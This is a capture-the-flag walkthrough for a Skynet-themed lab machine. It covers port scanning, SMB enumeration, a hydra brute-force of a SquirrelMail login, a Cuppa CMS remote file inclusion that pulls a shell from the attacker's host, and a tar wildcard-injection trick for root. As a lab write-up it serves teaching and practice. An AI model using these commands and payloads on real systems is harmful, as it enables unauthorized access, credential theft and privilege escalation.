1. Check nmap > Ports 22, 80, 110, 139, 143, and 445 are open.
2. Seeing the port 80 open, we can say it must be a website. Though visiting the website gives nothing.
3. Use gobuster with /usr/share/dirb/wordlists/common.txt wordlist to find any hidden directory. We get the /admin, /config, and
   /squirrelmail directories, but we get a 403 error while visiting these except the /squirrelmail directory.
4. Let's enumerate the smb using enum4linux. We get two shares //IP/anonymous and //IP/milesdyson. Now logging into the anonymous
   share we get an interesting file which is "log1.txt" and it seems like a passwords list.
5. Use burpsuite proxy to get parameter of the login.php and use hydra with the username "milesdyson" we got from smb enumeration
   hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
   This command gives us the password which is "cyborg007haloterminator".
6. Logging into the SquirrelMail using the above creds gives us the smb password for the user "milesdyson" which is ")s{A&2Z=F^n_E.B`".
7. Let's login into the smb using the command "smbclient -U milesdyson //$IP/milesdyson" and we get an interesting file that is
   "notes/important.txt" which reveals a hidden directory "/45kra24zxs28v3yd". Though visiting this directory gives nothing.
8. Use gobuster again in the above directory with /usr/share/dirb/wordlists/common.txt wordlist to find any hidden directory.
   We get the /administrator directory.
9. Searching for "cuppa" on ExploitDB we can see that there is an interesting entry which is "Cuppa CMS - '/alertConfigField.php'
   Local/Remote File Inclusion". From here we get an exploit which is
   "http://IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://local_ip/shell.php". Using nc (netcat), we
   got a reverse shell and user.txt flag. We also got another interesting file in the backups directory which is "backup.sh". This script
   backs up the contents of the /var/www/html directory using tar. We can easily exploit it using the trick mentioned here >
   https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar
10. But before exploiting, let's cd into the /var/www/html directory. Then create our reverse shell file shell.sh in this directory, then
    follow the trick mentioned in the previous step, but use echo instead of touch.
	chmod 777 shell.sh
    	echo "" > "--checkpoint=1"
	echo "" > "--checkpoint-action=exec=sh shell.sh"
11. Next, listen to our port using nc (netcat) and we got a root shell along with our root.txt flag.
